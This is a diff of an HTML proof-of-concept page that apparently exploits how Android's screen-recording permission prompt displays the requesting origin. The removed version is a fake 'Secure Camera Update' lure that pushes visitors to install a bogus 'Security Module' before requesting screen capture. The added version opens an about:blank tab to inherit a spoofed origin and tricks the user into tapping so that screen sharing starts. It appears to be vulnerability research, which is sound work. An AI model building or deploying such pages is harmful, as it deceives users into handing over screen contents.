@@ -2,67 +2,40 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="manifest" href="manifest.json">
 <style>
   body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
-  .btn { background: #1a73e8; color: white; border: none; padding: 15px; font-size: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; margin: 10px; width: 80%; display: none; }
+  .btn { background: #34a853; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 80%; }
 </style>
 </head>
 <body>
-  <h2>Secure Camera Update</h2>
-  <p id="status">Checking system requirements...</p>
+  <h2>MediaProjection UI Bypass</h2>
+  <p style="color: #9aa0a6;">Target: Screen Share API</p>
   
-  <!-- Tombol 1: Memicu Instalasi PWA -->
-  <button class="btn" id="btn-install">1. Install Security Module</button>
-  
-  <!-- Tombol 2: Memicu Kamera (Bypass) -->
-  <button class="btn" id="btn-camera" style="background:#34a853;">2. Start Camera Verification</button>
+  <button class="btn" id="trigger">Start Screen Share</button>
 
 <script>
-let deferredPrompt;
-const btnInstall = document.getElementById('btn-install');
-const btnCamera = document.getElementById('btn-camera');
-const statusText = document.getElementById('status');
-
-// Mengecek apakah PWA bisa diinstal
-window.addEventListener('beforeinstallprompt', (e) => {
-    e.preventDefault();
-    deferredPrompt = e;
-    btnInstall.style.display = 'block';
-    statusText.innerText = "Step 1: Install required to proceed.";
-});
-
-// Aksi ketika tombol Install dipencet
-btnInstall.addEventListener('click', async () => {
-    if (deferredPrompt) {
-        deferredPrompt.prompt();
-        const { outcome } = await deferredPrompt.userChoice;
-        if (outcome === 'accepted') {
-            btnInstall.style.display = 'none';
-            btnCamera.style.display = 'block';
-            statusText.innerText = "Step 2: Proceed to verification.";
-            deferredPrompt = null;
-        }
-    }
-});
-
-// Mengecek kalau web udah dibuka dari mode PWA / WebAPK
-if (window.matchMedia('(display-mode: standalone)').matches) {
-    btnInstall.style.display = 'none';
-    btnCamera.style.display = 'block';
-    statusText.innerText = "Secure environment detected.";
-}
-
-// THE KILLSHOT: Hajar API Kamera
-// Kalau ini dieksekusi di dalam WebAPK, OS Android yang bakal ngerender ligaturnya!
-btnCamera.addEventListener('click', async () => {
-    try {
-        // Ini memanggil UI Screen Record bawaan Android (Belum di-patch ligaturnya!)
-        await navigator.mediaDevices.getDisplayMedia({video: true});
-        alert('SCREEN RECORD GRANTED!');
-    } catch (err) {
-        alert('Denied: ' + err);
-    }
+document.getElementById('trigger').addEventListener('click', () => {
+    // 1. Buka about:blank buat ngewarisin origin "ologoligature.github.io"
+    let victimWin = window.open('about:blank');
+    
+    // 2. Kasih instruksi di tab baru
+    setTimeout(() => {
+        victimWin.document.body.innerHTML = `
+            <body style="background:#202124; color:white; text-align:center; padding-top:40vh; font-family:sans-serif;">
+                <h3 style="color:#34a853;">👆 TAP ANYWHERE ON SCREEN 👆</h3>
+            </body>
+        `;
+        
+        // 3. Eksekusi Screen Share (Harus di-trigger pake klik di dalam about:blank)
+        victimWin.addEventListener('click', async () => {
+            try {
+                // Manggil UI MediaProjection bawaan OS Android
+                await victimWin.navigator.mediaDevices.getDisplayMedia({video: true});
+            } catch (err) {
+                console.log('User cancelled or error: ', err);
+            }
+        });
+    }, 150);
 });
 </script>
 </body>
